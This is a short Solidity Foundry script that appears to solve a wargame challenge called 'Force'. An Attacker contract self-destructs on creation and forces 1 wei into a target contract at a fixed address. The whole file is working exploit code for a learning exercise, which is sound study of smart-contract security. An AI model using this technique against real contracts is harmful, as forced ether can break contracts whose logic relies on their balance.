// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract Attacker {
    constructor(address payable _address) payable {
        selfdestruct(_address);
    }
}

contract ForceSolution is Script {
    Force public force = Force(0x0BF9aecAb926c84107f1961a1Ba3577cE15B9809);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        new Attacker{value: 1 wei}(payable(address(force)));
        vm.stopBroadcast();
    }
}
